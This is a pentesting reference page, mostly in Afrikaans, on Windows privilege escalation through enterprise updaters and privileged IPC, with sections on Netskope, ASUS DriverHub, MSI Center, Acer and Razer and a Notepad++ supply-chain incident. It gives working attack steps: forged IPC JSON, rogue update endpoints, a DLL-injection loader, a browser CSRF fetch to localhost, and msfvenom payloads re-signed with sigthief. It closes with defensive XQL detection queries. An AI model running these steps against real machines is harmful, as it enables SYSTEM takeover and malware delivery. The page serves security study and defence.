# Abuse van Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Hierdie bladsy generaliseer 'n klas van Windows local privilege escalation chains wat gevind is in enterprise endpoint agents en updaters wat 'n lae-wrywing IPC surface en 'n privileged update flow blootstel. 'n Verteenwoordigende voorbeeld is Netskope Client for Windows < R129 (CVE-2025-0309), waar 'n gebruiker met lae privileges kan dwing dat enrolment na 'n attacker-controlled server plaasvind en dan 'n malicious MSI lewer wat die SYSTEM service installeer.

Kernidees wat jy teen soortgelyke produkte kan hergebruik:
- Abuse 'n privileged service se localhost IPC om re-enrollment of reconfiguration na 'n attacker server af te dwing.
- Implementeer die vendor se update endpoints, lewer 'n rogue Trusted Root CA, en wys die updater na 'n malicious, “signed” package.
- Ontduik weak signer checks (CN allow-lists), optional digest flags, en lax MSI properties.
- As IPC “encrypted” is, lei die key/IV af van world-readable machine identifiers wat in die registry gestoor is.
- As die service callers beperk volgens image path/process name, inject in 'n allow-listed process of spawn een suspended en bootstrap jou DLL via 'n minimal thread-context patch.

---
## 1) Forcing enrollment to an attacker server via localhost IPC

Baie agents ship 'n user-mode UI process wat met 'n SYSTEM service oor localhost TCP kommunikeer met behulp van JSON.

Waargeneem in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Craft 'n JWT enrollment token waarvan die claims die backend host beheer (bv. AddonUrl). Gebruik alg=None sodat geen signature vereis word nie.
2) Stuur die IPC message wat die provisioning command met jou JWT en tenant name invoke:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Die diens begin jou rogue server tref vir enrollment/config, bv.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notas:
- As caller verification op path/name gebaseer is, laat die request ontstaan vanaf 'n allow-listed vendor binary (sien §4).

---
## 2) Hijacking die update channel om code as SYSTEM uit te voer

Sodra die client met jou server praat, implementeer die verwagte endpoints en stuur dit na 'n attacker MSI. Tipiese volgorde:

1) /v2/config/org/clientconfig → Return JSON config met 'n baie kort updater interval, bv.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Gee 'n PEM CA certificate terug. Die diens installeer dit in die Local Machine Trusted Root store.
3) /v2/checkupdate → Verskaf metadata wat na 'n malicious MSI en 'n fake version wys.

Om algemene checks wat in die wild gesien word te omseil:
- Signer CN allow-list: die diens mag net die Subject CN check as dit gelyk is aan “netSkope Inc” of “Netskope, Inc.”. Jou rogue CA kan 'n leaf met daardie CN issue en die MSI sign.
- CERT_DIGEST property: sluit 'n benigne MSI property genaamd CERT_DIGEST in. Geen enforcement by install nie.
- Optional digest enforcement: config flag (bv. check_msi_digest=false) disable extra cryptographic validation.

Resultaat: die SYSTEM diens installeer jou MSI vanaf
C:\ProgramData\Netskope\stAgent\data\*.msi
en voer arbitrary code uit as NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

Vanaf R127 het Netskope IPC JSON in 'n encryptData field toegedraai wat soos Base64 lyk. Reverse het gewys AES met key/IV afgelei van registry values wat deur enige user leesbaar is:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers kan encryption reproduseer en geldige encrypted commands vanaf 'n standard user stuur. Algemene wenk: as 'n agent skielik sy IPC “encrypt”, soek vir device IDs, product GUIDs, install IDs onder HKLM as materiaal.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Sommige services probeer die peer authenticate deur die TCP connection se PID op te los en die image path/name te vergelyk teen allow-listed vendor binaries wat onder Program Files geleë is (bv. stagentui.exe, bwansvc.exe, epdlp.exe).

Twee praktiese bypasses:
- DLL injection in 'n allow-listed process (bv. nsdiag.exe) en proxy IPC van binne af.
- Spawn 'n allow-listed binary suspended en bootstrap jou proxy DLL sonder CreateRemoteThread (sien §5) om driver-enforced tamper rules te satisfy.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products ship dikwels 'n minifilter/OB callbacks driver (bv. Stadrv) om gevaarlike rights van handles na protected processes af te strip:
- Process: verwyder PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: beperk tot THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

'n Betroubare user-mode loader wat hierdie constraints respekteer:
1) CreateProcess van 'n vendor binary met CREATE_SUSPENDED.
2) Verkry handles wat jy nog mag gebruik: PROCESS_VM_WRITE | PROCESS_VM_OPERATION op die process, en 'n thread handle met THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (of net THREAD_RESUME as jy code op 'n bekende RIP patch).
3) Oorskryf ntdll!NtContinue (of 'n ander vroeë, guaranteed-mapped thunk) met 'n klein stub wat LoadLibraryW op jou DLL path roep, en dan terugspring.
4) ResumeThread om jou stub in-process te trigger, en jou DLL te load.

Omdat jy nooit PROCESS_CREATE_THREAD of PROCESS_SUSPEND_RESUME op 'n reeds protected process gebruik het nie (jy het dit self geskep), is die driver se policy satisfied.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automateer 'n rogue CA, malicious MSI signing, en dien die nodige endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope is 'n custom IPC client wat arbitrary (optionally AES-encrypted) IPC messages craft en die suspended-process injection insluit om vanaf 'n allow-listed binary te originate.

## 7) Fast triage workflow for unknown updater/IPC surfaces

Wanneer jy 'n nuwe endpoint agent of motherboard “helper” suite teëkom, is 'n vinnige workflow gewoonlik genoeg om te sien of jy na 'n belowende privesc target kyk:

1) Enumerate loopback listeners en map hulle terug na vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Lys kandidaat-benamde pype:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Myn register-gebaseerde roetingsdata wat gebruik word deur plugin-gebaseerde IPC-bedieners:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Ekstraheer endpoint name, JSON keys, en command IDs eers uit die user-mode client. Packed Electron/.NET frontends lek dikwels die volle schema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Jag vir die werklike trust-predikaat, nie net die code path wat uiteindelik die proses launch nie:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Patrone wat die moeite werd is om te prioritiseer:
- `CryptQueryObject`/sertifikaat-ontleding sonder `WinVerifyTrust` beteken gewoonlik “sertifikaat bestaan” is behandel as “sertifikaat is trusted”, wat sertifikaat-kloning of ander fake-signer-truuks moontlik maak.
- Substring/suffix checks oor `Origin`, `Referer`, download URLs, process names, of signer CNs is nie authentication nie. `contains(".vendor.com")` is gewoonlik uitbuitbaar met aanvaller-beheerde lookalike domains.
- As die laag-geprivilegieerde GUI besluit “die file is trusted” en die SYSTEM broker eenvoudig daardie resultaat gebruik, om die client-side DLL/JS te patch of herimplementeer omseil dikwels die boundary heeltemal (Razer-style split validation).
- As die broker ’n payload na `%TEMP%`/`C:\Windows\Temp` kopieer en dit dan vanaf daardie path valideer of schedule, toets dadelik vir TOCTOU replacement windows en vir sibling plugin modules wat alternatiewe `ExecuteTask()` wrappers met swakker checks blootstel.

Vir targets met baie named-pipes is PipeViewer ’n vinnige manier om weak DACLs en remotely reachable pipes raak te sien voordat jy die protocol in diepte begin reverse.

As die target callers net deur PID, image path, of process name authenticates, behandel dit as ’n speed bump eerder as ’n boundary: injecting in die legitimate client, of die connection maak vanaf ’n allow-listed process, is dikwels genoeg om die server se checks te slaag. Vir named pipes spesifiek dek [hierdie page oor client impersonation en pipe abuse](named-pipe-client-impersonation.md) die primitive in meer diepte.

---
## 1) Browser-to-localhost CSRF teen privileged HTTP APIs (ASUS DriverHub)

DriverHub ship ’n user-mode HTTP service (ADU.exe) op 127.0.0.1:53000 wat browser calls verwag wat van https://driverhub.asus.com kom. Die origin filter doen eenvoudig `string_contains(".asus.com")` oor die Origin header en oor download URLs wat deur `/asus/v1.0/*` blootgestel word. Enige attacker-controlled host soos `https://driverhub.asus.com.attacker.tld` slaag dus die check en kan state-changing requests vanaf JavaScript stuur. Sien [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) vir addisionele bypass patterns.

Practical flow:
1) Registreer ’n domain wat `.asus.com` insluit en host ’n malicious webpage daar.
2) Gebruik `fetch` of XHR om ’n privileged endpoint (bv. `Reboot`, `UpdateApp`) op `http://127.0.0.1:53000` te call.
3) Stuur die JSON body wat die handler verwag – die packed frontend JS wys die schema hieronder.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Selfs die PowerShell CLI hieronder vertoon slaag wanneer die Origin-kop gespoof word na die vertroude waarde:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Enige blaaierbesoek aan die aanvaller se werf word dus ’n 1-click (of 0-click via `onload`) local CSRF wat ’n SYSTEM helper aandryf.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` laai arbitrary executables af wat in die JSON body gedefinieer is en kas hulle in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation hergebruik dieselfde substring logic, so `http://updates.asus.com.attacker.tld:8000/payload.exe` word aanvaar. Ná die download, kyk ADU.exe net of die PE ’n signature bevat en dat die Subject string met ASUS ooreenstem voordat dit loop – geen `WinVerifyTrust`, geen chain validation nie.

Om die flow te weaponize:
1) Skep ’n payload (bv. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Kloon ASUS se signer daarin (bv. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` op ’n `.asus.com` lookalike domain en trigger UpdateApp via die browser CSRF hierbo.

Omdat beide die Origin en URL filters substring-based is en die signer check net strings vergelyk, trek DriverHub die attacker binary in en execute dit onder sy elevated context.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center se SYSTEM service stel ’n TCP protocol bloot waar elke frame `4-byte ComponentID || 8-byte CommandID || ASCII arguments` is. Die core component (Component ID `0f 27 00 00`) ship `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Sy handler:
1) Kopieer die supplied executable na `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifieer die signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject moet gelyk wees aan “MICRO-STAR INTERNATIONAL CO., LTD.” en `WinVerifyTrust` slaag).
3) Skep ’n scheduled task wat die temp file as SYSTEM met attacker-controlled arguments laat loop.

Die gekopieerde file word nie tussen verification en `ExecuteTask()` gesluit nie. ’n Attacker kan:
- Frame A stuur wat na ’n legit MSI-signed binary wys (waarborg dat die signature check slaag en die task gequeue word).
- Dit race met herhaalde Frame B messages wat na ’n malicious payload wys, en `MSI Center SDK.exe` net ná verification overwrite.

Wanneer die scheduler fire, execute dit die overwritten payload onder SYSTEM al is die oorspronklike file geverifieer. Betroubare exploitation gebruik twee goroutines/threads wat CMD_AutoUpdateSDK spam totdat die TOCTOU window gewen is.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Elke plugin/DLL wat deur `MSI.CentralServer.exe` gelaai word, ontvang ’n Component ID wat onder `HKLM\SOFTWARE\MSI\MSI_CentralServer` gestoor word. Die eerste 4 bytes van ’n frame kies daardie component, wat aanvallers toelaat om commands na arbitrary modules te route.
- Plugins kan hul eie task runners definieer. `Support\API_Support.dll` stel `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` bloot en roep direk `API_Support.EX_Task::ExecuteTask()` met **geen signature validation** – enige local user kan dit na `C:\Users\<user>\Desktop\payload.exe` wys en deterministiese SYSTEM execution kry.
- Sniffing loopback met Wireshark of instrumenting die .NET binaries in dnSpy onthul vinnig die Component ↔ command mapping; custom Go/ Python clients kan dan frames replay.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) stel `\\.\pipe\treadstone_service_LightMode` bloot, en sy discretionary ACL laat remote clients toe (bv. `\\TARGET\pipe\treadstone_service_LightMode`). As command ID `7` met ’n file path gestuur word, roep dit die service se process-spawning routine aan.
- Die client library serialiseer ’n magic terminator byte (113) saam met args. Dynamic instrumentation met Frida/`TsDotNetLib` (sien [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) vir instrumentation tips) wys dat die native handler hierdie value na ’n `SECURITY_IMPERSONATION_LEVEL` en integrity SID map voordat `CreateProcessAsUser` geroep word.
- As 113 (`0x71`) met 114 (`0x72`) vervang word, val dit in die generic branch wat die volle SYSTEM token behou en ’n high-integrity SID (`S-1-16-12288`) stel. Die spawned binary loop dus as unrestricted SYSTEM, beide lokaal en cross-machine.
- Kombineer dit met die exposed installer flag (`Setup.exe -nocheck`) om ACC selfs op lab VMs op te stel en die pipe sonder vendor hardware te gebruik.

Hierdie IPC bugs wys hoekom localhost services mutual authentication moet afdwing (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) en hoekom elke module se “run arbitrary binary” helper dieselfde signer verifications moet deel.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 het nog ’n nuttige patroon by hierdie familie gevoeg: ’n low-privileged user kan ’n COM helper vra om ’n process deur `RzUtility.Elevator` te launch, terwyl die trust decision aan ’n user-mode DLL (`simple_service.dll`) gedelegeer word eerder as wat dit robuust binne die privileged boundary afgedwing word.

Waargenome exploitation path:
- Instansieer die COM object `RzUtility.Elevator`.
- Roep `LaunchProcessNoWait(<path>, "", 1)` aan om ’n elevated launch te request.
- In die public PoC word die PE-signature gate binne `simple_service.dll` gepatch voordat die request ingestuur word, wat toelaat dat ’n arbitrary attacker-chosen executable gelanseer word.

Minimale PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
General takeaway: when reversing “helper” suites, do not stop at localhost TCP or named pipes. Check for COM classes with names such as `Elevator`, `Launcher`, `Updater`, or `Utility`, then verify whether the privileged service actually validates the target binary itself or merely trusts a result computed by a patchable user-mode client DLL. This pattern generalizes beyond Razer: any split design where the high-privilege broker consumes an allow/deny decision from the low-privilege side is a candidate privesc surface.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Between June 2025 and December 2025, attackers who compromised the hosting infrastructure behind the Notepad++ update flow selectively served malicious manifests to chosen victims. Older WinGUp-based updaters did not fully verify update authenticity, so a hostile XML response could redirect clients to attacker-controlled URLs. Because the client accepted HTTPS content without enforcing both a trusted certificate chain and a valid PE signature on the downloaded installer, victims fetched and executed a trojanized NSIS `update.exe`.

Operational flow (no local exploit required):
1. **Infrastructure interception**: compromise CDN/hosting and answer update checks with attacker metadata pointing at a malicious download URL.
2. **Trojanized NSIS**: the installer fetches/executes a payload and abuses two execution chains:
- **Bring-your-own signed binary + sideload**: bundle the signed Bitdefender `BluetoothService.exe` and drop a malicious `log.dll` in its search path. When the signed binary runs, Windows sideloads `log.dll`, which decrypts and reflectively loads the Chrysalis backdoor (Warbird-protected + API hashing to hinder static detection).
- **Scripted shellcode injection**: NSIS executes a compiled Lua script that uses Win32 APIs (e.g., `EnumWindowStationsW`) to inject shellcode and stage Cobalt Strike Beacon.

Hardening/detection takeaways for any auto-updater:
- Enforce **certificate + signature verification** of the downloaded installer (pin vendor signer, reject mismatched CN/chain) and sign the update manifest itself (e.g., XMLDSig). Block manifest-controlled redirects unless validated.
- Treat **BYO signed binary sideloading** as a post-download detection pivot: alert when a signed vendor EXE loads a DLL name from outside its canonical install path (e.g., Bitdefender loading `log.dll` from Temp/Downloads) and when an updater drops/executes installers from temp with non-vendor signatures.
- Monitor **malware-specific artifacts** observed in this chain (useful as generic pivots): mutex `Global\Jdhfv_1.0.1`, anomalous `gup.exe` writes to `%TEMP%`, and Lua-driven shellcode injection stages.
- Notepad++ responded by strengthening WinGUp in v8.8.9 and later: the returned XML is now signed (XMLDSig), and newer builds enforce certificate + signature verification of the downloaded installer instead of trusting the transport alone.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> launching a non-Notepad++ installer</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Hierdie patrone generaliseer na enige updater wat unsigned manifests aanvaar of versuim om installer signers vas te pen—network hijack + malicious installer + BYO-signed sideloading lewer remote code execution onder die dekmantel van “trusted” updates.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
